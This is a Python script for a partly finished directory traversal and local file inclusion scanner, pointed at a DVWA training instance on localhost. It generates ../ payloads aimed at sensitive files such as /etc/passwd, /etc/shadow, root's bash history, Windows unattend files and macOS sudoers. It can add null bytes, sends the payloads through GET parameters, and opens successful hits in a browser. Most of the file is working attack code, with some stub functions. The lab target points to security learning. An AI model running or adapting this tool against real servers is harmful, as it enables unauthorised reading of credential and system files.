# -*- coding: utf-8 -*-

import sys
import time
import requests
import urllib.parse as urlparse
import re
import webbrowser

session = requests.Session()

# PAYLOAD
# def generate_payloads(url, payload_list, os):
    # if find_injection_points(url):
        # directory_transversal(payload_list, os)

def find_injection_points(url, parameters, key):
    """
    Finds the payload injection points in the URL
    """
    try:

        for parameter in parameters:
            name = parameter.split("=")[0]
            #value = parameter.split("=")[1]
            #key.append(name)
            key.append(name)
            return key

    except IndexError:
        return -1

def location(os):
    """
	Linux File Locations 
	or 
	Windows File Locations 
	or 
	OS X/macOS File Locations
	"""
    if os == 'linux':
        test_file = ['etc/passwd']
        #test_file = ['etc/passwd',  'etc/shadow',  'etc/issue',  'proc/version',  'etc/profile', 'root/.bash_history', 'var/log/dmessage', 'var/mail/root', 'var/spool/cron/crontabs/root']
    elif os == 'windows':
        test_file = ['WINDOWS/system32/drivers/etc/hosts', 'WINDOWS/system32/win.ini', 'WINDOWS/system32/debug/NetSetup.log', 'WINDOWS/system32/config/AppEvent.Evt', 'WINDOWS/system32/config/SecEvent.Evt', 'WINDOWS/Panther/unattend.txt', 'WINDOWS/Panther/unattend.xml', 'WINDOWS/Panther/unattended.xml', 'WINDOWS/Panther/sysprep.inf']
    else: #OS X/macOS
        test_file = ['etc/fstab', 'etc/master.passwd', 'etc/resolv.conf', 'etc/sudoers', 'etc/sysctl.conf']
    return test_file

def directory_transversal(payload_list, os):
    """
    Gets the parameter and adds the ../../.. ...
    """
    test_file = location(os)

    for x in range(0, len(test_file)):
        for y in range(0, 7):
            if y == 0:
                temp = ('/' + test_file[x])
                payload_list.append(temp)
            else:
                temp = ((y * '../') + test_file[x])
                payload_list.append(temp)
    return payload_list

def generic_null_byte(payload_list):
    """Just addes %00 to the end of the payload"""
    temp = []
    for payload in payload_list:
        temp.append(payload + "%00")
    return temp

def php_filter():
    pass

def php_zip():
    pass

def php_expect():
    pass

def php_input():
    pass

def php_phar():
    pass

def php_fill():
    pass

# REQUEST
class TestConnect:
    """Class used for testing requests"""
    def __init__(self, url):
        self.url = url
        pass

    def urlparse(self, url):
        """
        Parse the URL to the GET parameters
        """
        return urlparse.urlparse(url)


    def target(self, url):
        """
        Is the target valid?
        """
        try:
            r = requests.head(url)
        except requests.ConnectionError:
            print("Connection Error: \t" + url)
            return -1
        except requests.exceptions.MissingSchema:
            print("Invalid URL:\t" + url)
            return -1

        print("Status code " + str(r.status_code))
        if r.status_code == 200:
            print(url + "\treturned " + str(200))
            return 1

class Get:
    """Sends payload via a GET request"""
    def __init__(self, url, key, payload_list, null_byte):
        self.url = url
        self.key = key
        self.payload_list = payload_list
        self.null_byte = null_byte

    def request_response(self):
        para = {}
        temp_payload = []
        if self.null_byte == True:
            temp_payload = generic_null_byte(self.payload_list)
        else:
            temp_payload = self.payload_list

        for i in range(0, len(temp_payload)):
            para[self.key[0]] = temp_payload[i]
            r = requests.get(self.url, params = para)
            if r.status_code == 200:
                webbrowser.open(self.url + '?' + self.key[0] + '=' + temp_payload[i])

class Post:
    """Sends payload via a POST request"""
    def __init__(self):
        pass

class Cookies:
    """Sends payload via cookie"""
    def __init__(self):
        pass

class Crawler:
    """Class used for crawlers"""
    def __init__(self):
        pass


def main():
    # global session
    # url = 'http://localhost:8080/dvwa/'
    # r = session.get(url)
    # user_token = re.findall("value='(.*)'", r.text)[0]
    # url = 'http://localhost:8080/dvwa/login.php'
    # r = session.post(url, data={'username':'admin', 'password':'password', 'user_token':user_token, 'Login':'Login'})
    # session.cookies.set('security', 'low', path='/dvwa', domain='localhost:8080')

    url = 'http://localhost:8080/dvwa/vulnerabilities/fi/?page=include.php'
    php = True
    os = 'linux'
    key = []
    #key_value = {}
    payload_list = [] #[../../../../../]/etc/passwd
    parameters = []
    null_byte = False #%00
    test = TestConnect(url)

    if test.target(url) != -1:

        url_parameters = test.urlparse(url)
        print("Scheme:\t" + str(url_parameters.scheme))
        print("Netloc:\t" + str(url_parameters.netloc))
        print("Path:\t" + str(url_parameters.path))
        print("Params:\t" + str(url_parameters.params))
        print("Query:\t" + str(url_parameters.query))
        print("Frag:\t" + str(url_parameters.fragment))
        if url_parameters.query:
            if url_parameters.query != "":
                temp = url_parameters.query
                temp = temp.split("&")
                print("Target has " + str(len(temp)) + " injectable GET parameters to test.")
                for x in range(0, len(temp)):
                    parameters.append(temp[x])
                    print("GET parameter " + str(x + 1) + ": \t" + temp[x])

                is_injection_point = find_injection_points(url, parameters, key)
                if is_injection_point != -1:
                    key = is_injection_point
                    payload_list = directory_transversal(payload_list, os)

        else:
            print("No GET parameters")
    else:
        print("Failed connection: " + url)
    url_not_para = url.split('?')[0]
	
    get_payloads = Get(url_not_para, key, payload_list, null_byte)
    get_payloads.request_response()

if __name__== "__main__":
    main()